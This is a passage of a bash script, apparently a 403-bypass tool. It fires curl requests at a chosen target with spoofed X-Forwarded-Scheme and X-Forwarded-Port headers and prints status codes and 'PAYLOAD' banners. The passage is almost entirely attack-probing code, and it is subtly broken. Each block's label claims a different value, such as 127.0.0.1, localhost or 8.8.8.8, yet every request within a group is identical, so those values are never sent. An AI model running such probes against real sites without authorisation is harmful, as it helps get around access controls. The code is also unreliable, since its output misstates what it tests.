	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Scheme HTTPs Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

}	
function Port_Bypass(){
	echo -e ${blue}"-------------------------"${end}
	echo -e ${cyan}"[+] Port Based Bypass"${end}
	echo -e ${blue}"-------------------------"${end}
	echo -n "X-Forwarded-Port 443 Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 443 Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Forwarded-Port 4443 Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 4443 Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded-Port 80 Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Port 80 Payload: 0.0.0.0"
